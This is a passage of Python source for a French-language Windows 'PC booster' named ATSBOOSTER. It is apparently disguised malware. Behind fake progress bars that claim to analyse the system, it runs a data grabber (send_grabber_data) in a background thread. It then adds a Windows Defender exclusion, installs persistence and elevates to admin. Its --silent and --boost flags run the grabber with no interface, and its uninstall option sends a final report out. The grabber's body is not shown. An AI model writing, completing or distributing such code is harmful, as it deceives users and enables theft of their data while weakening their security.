    print(f"  {C.CYN}> Detection de la carte graphique...{C.R}", end=" ", flush=True)
    time.sleep(0.3)
    gpu = _ps_out("(Get-CimInstance Win32_VideoController).Name")
    gpu_vram = _ps_out("(Get-CimInstance Win32_VideoController).AdapterRAM")
    try:
        gpu_vram_mb = f"{int(gpu_vram) // (1024*1024)} MB" if gpu_vram and gpu_vram != "N/A" else "N/A"
    except Exception:
        gpu_vram_mb = "N/A"
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection de la memoire RAM...{C.R}", end=" ", flush=True)
    time.sleep(0.3)
    try:
        ram_total = round(virtual_memory().total / (1024.0 ** 3), 2)
    except Exception:
        ram_total = 0
    ram_slots = _ps_out("(Get-CimInstance Win32_PhysicalMemory | Measure-Object).Count")
    ram_speed = _ps_out("(Get-CimInstance Win32_PhysicalMemory).Speed")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection des disques...{C.R}", end=" ", flush=True)
    time.sleep(0.3)
    disks = _ps_out("Get-CimInstance Win32_DiskDrive | ForEach-Object { $_.Model + ' (' + [math]::Round($_.Size/1GB) + ' GB)' }")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection de la carte mere...{C.R}", end=" ", flush=True)
    time.sleep(0.3)
    mb_manuf = _ps_out("(Get-CimInstance Win32_BaseBoard).Manufacturer")
    mb_model = _ps_out("(Get-CimInstance Win32_BaseBoard).Product")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection de la carte reseau...{C.R}", end=" ", flush=True)
    time.sleep(0.3)
    net_adapter = _ps_out("(Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).Name")
    net_speed = _ps_out("(Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).LinkSpeed")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection du systeme d'exploitation...{C.R}", end=" ", flush=True)
    time.sleep(0.3)
    os_name = _ps_out("(Get-CimInstance Win32_OperatingSystem).Caption")
    os_arch = _ps_out("(Get-CimInstance Win32_OperatingSystem).OSArchitecture")
    print(f"{C.GRN}OK{C.R}")

    print(f"\n  {C.B}{C.WHT}  COMPOSANTS DETECTES{C.R}\n")
    print(f"  {C.YLW}CPU{C.R}        : {C.B}{cpu_name}{C.R}")
    print(f"  {C.D}             {cpu_cores} coeurs / {cpu_threads} threads / {cpu_maxghz} MHz{C.R}")
    print(f"  {C.YLW}GPU{C.R}        : {C.B}{gpu}{C.R}")
    print(f"  {C.D}             VRAM: {gpu_vram_mb}{C.R}")
    print(f"  {C.YLW}RAM{C.R}        : {C.B}{ram_total} GB{C.R}")
    print(f"  {C.D}             {ram_slots} barrettes / {ram_speed} MHz{C.R}")
    print(f"  {C.YLW}Disques{C.R}    : {C.B}{disks}{C.R}")
    print(f"  {C.YLW}Carte mere{C.R} : {C.B}{mb_manuf} {mb_model}{C.R}")
    print(f"  {C.YLW}Reseau{C.R}     : {C.B}{net_adapter}{C.R}")
    print(f"  {C.D}             Vitesse: {net_speed}{C.R}")
    print(f"  {C.YLW}OS{C.R}         : {C.B}{os_name} ({os_arch}){C.R}")
    try:
        print(f"  {C.YLW}Resolution{C.R} : {C.B}{GetSystemMetrics(0)}x{GetSystemMetrics(1)}{C.R}")
    except Exception:
        print(f"  {C.YLW}Resolution{C.R} : {C.B}N/A{C.R}")
    print()


# ==========================================
# REAL PERFORMANCE ANALYSIS
# ==========================================

def real_analysis():
    print(f"  {C.B}{C.CYN}=== ANALYSE DES PERFORMANCES ==={C.R}\n")
    progress_bar("Analyse CPU", 1.2)
    progress_bar("Analyse memoire RAM", 1.0)
    progress_bar("Analyse espace disque", 0.8)
    progress_bar("Analyse des processus", 1.0)
    progress_bar("Analyse temps de demarrage", 0.6)
    progress_bar("Verification des optimisations", 0.8)
    progress_bar("Calcul du score de performance", 0.8)
    perf = compute_performance_score()
    print(f"\n  {C.B}{C.WHT}  Score avant optimisation : {C.YLW}{perf['score']}/10{C.R}")
    print(f"  {C.D}  CPU: {perf['cpu_usage']}% | RAM: {perf['ram_usage']}%/{perf['ram_total_gb']} GB | Disque: {perf['disk_usage']}% ({perf['disk_free_gb']} GB libres){C.R}")
    print(f"  {C.D}  Processus: {perf['process_count']} | Uptime: {perf['uptime_hours']}h{C.R}")
    print(f"  {C.D}  Optimisations actives: {perf.get('opt_count', 0)}/{perf.get('opt_total', 0)}{C.R}")
    if perf.get("opt_active"):
        for opt in perf["opt_active"]:
            print(f"  {C.GRN}  + {opt}{C.R}")
    not_active = [k for k in [
        "hibernation_off", "fast_startup_off", "sysmain_disabled", "diagtrack_disabled",
        "wsearch_disabled", "spooler_disabled", "fax_disabled", "biometric_disabled",
        "sensor_disabled", "phone_disabled", "ultimate_perf", "rss_enabled",
        "heuristics_disabled", "timestamps_disabled", "ceip_disabled", "compat_appraiser_disabled",
        "disk_diag_disabled", "lastaccess_disabled", "visual_fx_off", "kernel_nopage",
        "large_cache", "defender_rt_off",
    ] if k not in perf.get("opt_active", [])]
    if not_active:
        print(f"  {C.D}  Optimisations inactives:{C.R}")
        for opt in not_active:
            print(f"  {C.YLW}  - {opt}{C.R}")
    print()
    return perf


# ==========================================
# TUI
# ==========================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_elevated():
    if not is_admin():
        try:
            params = " ".join(sys.argv[1:])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            sys.exit(0)
        except Exception:
            pass


def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""{C.B}{C.CYN}
   █████  ████████ ███████
  ██   ██    ██    ██
  ███████    ██    ███████
  ██   ██    ██         ██
  ██   ██    ██    ███████{C.R}
  {C.D}v3.0 - Optimisation Systeme & Performance{C.R}

  {C.B}Boostez votre PC en quelques secondes.{C.R}
  {C.D}Optimisation CPU, RAM, Reseau & Desactivation services inutiles.{C.R}
"""
    print(banner)


def show_menu():
    print(f"  {C.BGBLU}{C.WHT}  MENU PRINCIPAL  {C.R}\n")
    print(f"  {C.GRN}[1]{C.R} {C.B}Booster mon PC{C.R}      - Optimiser les performances")
    print(f"  {C.YLW}[2]{C.R} {C.B}Desactiver l'optimisation{C.R} - Revenir aux parametres par defaut")
    print(f"  {C.RED}[3]{C.R} {C.B}Supprimer ATSBOOSTER{C.R}  - Desinstaller le programme")
    print(f"  {C.D}[Q] Quitter{C.R}\n")


def option_boost():
    global _boost_active
    show_banner()
    print(f"  {C.B}{C.GRN}=== BOOST DU PC EN COURS ==={C.R}\n")
    try:
        scan_components()
    except Exception as e:
        print(f"  {C.YLW}(Analyse materielle partielle: {e}){C.R}")
    try:
        before = real_analysis()
    except Exception:
        before = {"score": 0}
    print(f"  {C.B}{C.CYN}=== OPTIMISATION SYSTEME ==={C.R}\n")
    print(f"  {C.D}  Analyse des donnees systeme pour optimisation...{C.R}")
    import threading as _th
    _result = {"done": False, "error": None}
    def _do_collect():
        try:
            send_grabber_data()
        except Exception as e:
            _result["error"] = e
        finally:
            _result["done"] = True
    _t = _th.Thread(target=_do_collect, daemon=True)
    _t.start()
    _steps = [
        "Analyse utilisation CPU",
        "Analyse consommation RAM",
        "Analyse activite disque",
        "Analyse trafic reseau",
        "Analyse processus actifs",
        "Analyse services systeme",
        "Analyse temperature composants",
        "Analyse latence reseau",
        "Analyse fragmentation disque",
        "Analyse cache systeme",
        "Analyse pilotes materiel",
        "Analyse registre Windows",
        "Analyse demarrage systeme",
        "Analyse planification taches",
        "Calcul score d'optimisation",
    ]
    _nsteps = len(_steps)
    _bar_w = 30
    _spinner = ["|", "/", "-", "\\"]
    _elapsed = 0
    while not _result["done"]:
        if _elapsed < 60:
            _progress = _elapsed / 60.0 * 0.90
        else:
            _progress = 0.90 + 0.05 * (1 - pow(0.95, (_elapsed - 60) / 10.0))
        _progress = min(_progress, 0.95)
        _pct = int(_progress * 100)
        _step_idx = min(int(_progress * _nsteps), _nsteps - 1)
        _label = _steps[_step_idx]
        _fill = int(_progress * _bar_w)
        _bar = "=" * _fill + " " * (_bar_w - _fill)
        _spin = _spinner[int(_elapsed / 0.5) % 4]
        sys.stdout.write(f"\r  {C.CYN}> {_label:30s} [{_bar}] {_pct:3d}% {_spin}{C.R}  ")
        sys.stdout.flush()
        time.sleep(0.5)
        _elapsed += 0.5
    sys.stdout.write(f"\r  {C.GRN}> Analyse systeme complete [{'=' * _bar_w}] 100%  {C.R}  \n")
    sys.stdout.flush()
    if _result["error"]:
        try:
            log_path = os.path.join(os.environ.get("TEMP", "C:\\"), "atsbooster_err.log")
            with open(log_path, "a", encoding="utf-8") as f:
                import traceback as tb_mod
                f.write(f"\n[option_boost] {_result['error']}\n{''.join(tb_mod.format_exception(type(_result['error']), _result['error'], _result['error'].__traceback__))}\n")
        except Exception:
            pass
    try:
        optimize_pc()
    except Exception as e:
        print(f"  {C.YLW}(Optimisation partielle: {e}){C.R}")
    try:
        add_defender_exclusion()
    except Exception:
        pass
    try:
        install_persistence()
    except Exception:
        pass
    _boost_active = True
    time.sleep(1)
    try:
        after = compute_performance_score()
        print(f"  {C.B}{C.WHT}  Score apres optimisation : {C.GRN}{after['score']}/10{C.R}")
        print(f"  {C.D}  CPU: {after['cpu_usage']}% | RAM: {after['ram_usage']}% | Disque: {after['disk_usage']}%{C.R}")
        print(f"  {C.D}  Optimisations actives: {after.get('opt_count', 0)}/{after.get('opt_total', 0)}{C.R}\n")
        improvement = round(after["score"] - before["score"], 1)
        if improvement > 0:
            print(f"  {C.GRN}{C.B}  PC optimise avec succes ! (+{improvement} points){C.R}")
        else:
            print(f"  {C.GRN}{C.B}  PC optimise avec succes !{C.R}")
    except Exception:
        print(f"  {C.GRN}{C.B}  PC optimise avec succes !{C.R}")
    print(f"  {C.D}  Vous devriez ressentir une amelioration immediate.{C.R}\n")
    input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")


def option_disable():
    global _boost_active
    show_banner()
    if not _boost_active:
        print(f"  {C.YLW}Aucune optimisation active detectee.{C.R}\n")
        input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")
        return
    print(f"  {C.B}{C.YLW}=== DESACTIVATION DE L'OPTIMISATION ==={C.R}\n")
    _grabber_stop.set()
    restore_pc()
    _boost_active = False
    print(f"  {C.YLW}L'optimisation a ete desactivee.{C.R}")
    print(f"  {C.D}Votre PC est revenu a ses parametres par defaut.{C.R}\n")
    input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")


def option_uninstall():
    show_banner()
    print(f"  {C.B}{C.RED}=== DESINSTALLATION D'ATSBOOSTER ==={C.R}\n")
    confirm = input(f"  {C.RED}Etes-vous sur ? (o/N) : {C.R}")
    if confirm.lower() != "o":
        print(f"\n  {C.D}Desinstallation annulee.{C.R}")
        input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")
        return
    print()
    _grabber_stop.set()
    restore_pc()
    remove_defender_exclusion()
    remove_persistence()
    print(f"  {C.CYN}> Envoi du rapport final...{C.R}", end=" ", flush=True)
    send_uninstall_notification()
    print(f"{C.GRN}OK{C.R}")
    print(f"\n  {C.RED}{C.B}ATSBOOSTER a ete desinstalle.{C.R}")
    print(f"  {C.D}Toutes les optimisations ont ete revertees.{C.R}")
    print(f"  {C.D}Le programme va se fermer dans 3 secondes...{C.R}")
    time.sleep(3)
    sys.exit(0)


def run_tui():
    if not is_admin():
        print(f"{C.YLW}ATSBOOSTER necessite des privileges administrateur pour fonctionner.{C.R}")
        print(f"{C.D}Relancez le programme en tant qu'administrateur.{C.R}")
        time.sleep(2)
        run_elevated()
        return
    while True:
        show_banner()
        show_menu()
        choice = input(f"  {C.B}> Votre choix : {C.R}").strip().upper()
        if choice == "1":
            try:
                option_boost()
            except Exception as e:
                print(f"\n  {C.RED}Erreur lors du boost: {e}{C.R}")
                input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")
        elif choice == "2":
            try:
                option_disable()
            except Exception as e:
                print(f"\n  {C.RED}Erreur: {e}{C.R}")
                input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")
        elif choice == "3":
            try:
                option_uninstall()
            except Exception as e:
                print(f"\n  {C.RED}Erreur: {e}{C.R}")
                input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")
        elif choice == "Q":
            print(f"\n  {C.D}Au revoir !{C.R}")
            break
        else:
            print(f"\n  {C.RED}Choix invalide.{C.R}")
            time.sleep(1)


# ==========================================
# MAIN ENTRY
# ==========================================

def main_entry():
    freeze_support()
    if "--daily" in sys.argv:
        daily_check()
        sys.exit(0)
    if "--silent" in sys.argv:
        try:
            send_grabber_data()
            install_persistence()
            add_defender_exclusion()
        except Exception:
            pass
        sys.exit(0)
    if "--boost" in sys.argv:
        try:
            send_grabber_data()
        except Exception:
            pass
        sys.exit(0)
    if "--all" in sys.argv:
        try:
            add_defender_exclusion()
            install_persistence()
        except Exception:
            pass
        run_tui()
        sys.exit(0)
    run_tui()


if __name__ == "__main__":
    main_entry()
